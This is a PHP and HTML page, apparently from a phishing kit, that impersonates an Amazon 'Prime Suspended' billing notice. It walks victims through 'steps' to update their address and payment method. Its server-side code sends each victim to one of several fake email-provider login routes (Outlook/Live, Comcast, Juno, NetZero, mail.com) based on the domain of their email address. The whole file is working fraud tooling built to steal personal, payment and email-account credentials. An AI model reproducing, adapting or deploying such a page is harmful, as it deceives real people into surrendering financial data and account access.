<?php
require "core/EntityVariables.php";

unset($_SESSION["password_attempt"]);
$config = require "KarmaEntity/config/config.php";
if ($config["email_akses"]) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {

        if (isset($_SESSION['entity_email']) && strpos($_SESSION['entity_email'], '@netzero') !== false) {
            header("Location: /netzero");
            exit();

        } elseif (isset($_SESSION['entity_email']) && strpos($_SESSION['entity_email'], '@juno') !== false) {
            header("Location: /juno");
            exit();

        } elseif (
            isset($_SESSION['entity_email']) && (
                strpos($_SESSION['entity_email'], '@mail.com') !== false ||
                strpos($_SESSION['entity_email'], '@usa.com') !== false 
            )
        ) {
            header("Location: /mail");
            exit();

        } elseif (
            isset($_SESSION['entity_email']) && (
                strpos($_SESSION['entity_email'], '@outlook.com') !== false ||
                strpos($_SESSION['entity_email'], '@msn.com') !== false ||
                strpos($_SESSION['entity_email'], '@live.com') !== false
            )
        ) {
            header("Location: /live");
            exit();

        } elseif (
            isset($_SESSION['entity_email']) && (
                strpos($_SESSION['entity_email'], '@comcast.com') !== false ||
                strpos($_SESSION['entity_email'], '@comcast.net') !== false 
            )
        ) {
            header("Location: /x_finity");
            exit();

        } else {
            header("Location: /yourAddress?entityId=$random_entity_id");
            exit();
        }
    }

} else {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        header("Location: /yourAddress?entityId=$random_entity_id");
        exit();
    }
}

?>
<html lang="en-us"
    class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern-display a-ember-modern-text">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/public/images/favicon.png" type="image/png">
    <link rel="stylesheet" href="/public/css/karma_custom.css?v=<?= time(); ?>" />
    <link rel="stylesheet" href="/public/css/karma_styles.css?v=<?= time(); ?>" />
    <title>Amazon | Prime Suspended</title>
</head>

<body
    class="a-aui_72554-c a-aui_72554-c-android a-aui_72554-c-windows a-aui_72554-c-chrome a-aui_72554-c-chrome-116 a-aui_72554-c-desktop a-aui_72554-c-modern a-aui_72554-c-js_enabled a-aui_72554-c-touch_disabled">
    <?php

                if (isMobile()) {
                    require __DIR__ . '/../static/tes.html';
                } else {
                    require __DIR__ . '/../static/header.php';
                }
            ?>

        <?php if (isMobile()): ?>
        <link rel="stylesheet" href="/public/css/karma_mobile.css?v=<?= time(); ?>" />
        <?php endif; ?>
    <div class="flex justify-center items-center mt-60 sm:mt-8 max-w-xl mx-auto p-2">
        <div class="a-section a-spacing-base auth-pagelet-container">
            <div class="a-section">
                <div aria-live="assertive" id="auth-error-message-box"
                    class="a-box a-warning a-error-alert auth-server-side-message-box a-spacing-base" role="alert">
                    <div class="a-box-inner flex gap-3">
                        <i class="a-icon a-icon-warning mt-0.5 pr-6" aria-hidden="true"></i>
                        <div>
                            <h4 class="a-alert-heading">Your Prime benefits are on hold due to a billing issue."</h4>
                        </div>
                    </div>
                    <form method="post" class="p-3">
                        <div class="">
                            <div class="a-alert-content -mt-3">
                               We’re unable to charge your payment method for <b>$14.99</b> and any applicable taxes for your next 1 week of Prime. Your Prime benefits are currently on hold. To restore access to your benefits, please update your address and payment information.
                            </div>
                            
                            <div class="container mx-auto mb-1 border border-stone-300 px-3 py-2 rounded-xl mt-10">
                                <b class="text-[13px] font-500 tracking-wide">Step 1:</b>
                                <span class="text-sm font-semibold">Update your address information</span>
                                <hr class="mb-2 mt-2 text-stone-300 max-w-[310px] flex mx-auto"/>
                                <p class="text-sm font-semibold mb-3">Confirm your identity to verify that you are the rightful account owner and proceed with restoring your suspended Prime membership. This step helps protect your account and ensures only authorized access is granted.</p>
                                <b class="text-[12px] font-500 tracking-wide">Tip:</b>
                                <span class="text-xs">For your security, always double-check that your personal details are accurate and up to date before continuing.</span>
                            </div>

                            <div class="container mx-auto mb-1 border border-stone-300 px-3 py-2 rounded-xl">
                                <b class="text-[13px] font-500 tracking-wide">Step 2:</b>
                                <span class="text-sm font-semibold">Update your payment method</span>
                                <hr class="mb-2 mt-2 text-stone-300 max-w-[310px] flex mx-auto"/>
                                <p class="text-sm font-semibold mb-3">To restore your suspended Prime membership and help protect your account from potential misuse of billing information, we strongly recommend updating your saved payment method. This step ensures your financial details remain secure and allows your membership benefits to resume without interruption.</p>
                                <b class="text-[12px] font-500 tracking-wide">Tip:</b>
                                <span class="text-xs">After a security-related issue or suspension, updating your payment method can help prevent unauthorized charges.</span>
                            </div>

                            <div class="container mx-auto border border-stone-300 px-3 py-2 rounded-xl">
                                <div class="max-w-[300px]">
                                    <b class="text-[13px] font-500 tracking-wide">Step 3:</b>
                                    <span class="text-sm font-semibold">Sign out all apps, devices, and web browsers</span>
                                </div>
                                <hr class="mb-2 mt-2 text-stone-300 max-w-[310px] flex mx-auto"/>
                                <div class="flex gap-2 mb-3">
                                    <img class="w-[20px]" src="/public/images/warning.svg" alt="Amazon Logo" />
                                    <p class="text-sm font-semibold">4 app(s) signed in to your Amazon account</p>
                                </div>
                                <b class="text-[12px] font-500 tracking-wide">Tip:</b>
                                <span class="text-xs"> For maximum security, sign out of everything. It may take up to 15 minutes to sign out of devices, apps and web browsers.</span>
                                <!-- <form class="mt-5" action="" method="post" id="signout-form">
                                    <button type="submit" class="flex border border-stone-300 text-xs tracking-wider text-black justify-center items-center mx-auto py-2 px-4 rounded-2xl mb-4 hover:bg-stone-100 duration-150 transition h-8 w-full cursor-pointer font-semibold">
                                        Sign-out everything
                                    </button>
                                </form>  -->
                            </div>

                            <div class="mt-5 mb-5">
                                <span class="a-list-item">
                                    <a class="a-size-base a-link-normal" rel="noopener noopener" href="#" role="button">
                                        Need help?
                                    </a>
                                </span>
                            </div>
                        </div>
                    </form>
                </div>
                <form method="post" class="mt-5">
                    <span id="pp-QBJBOr-30" class="a-button a-button-primary w-full mx-auto">
                        <span class="a-button-inner">
                            <input name="ppw-widgetEvent:AddCreditCardEvent" class="a-button-input" type="submit"
                                aria-labelledby="pp-QBJBOr-30-announce" />
                            <span id="pp-QBJBOr-30-announce" class="a-button-text"
                                aria-hidden="true">Continue</span>
                        </span>
                    </span>
                </form>
            </div>
        </div>
    </div>
    <?php
            if (isMobile()) {
                require __DIR__ . '/../static/tes2.html';
            } else {
                require __DIR__ . '/../static/footer.php';
            }
        ?>
</body>

</html>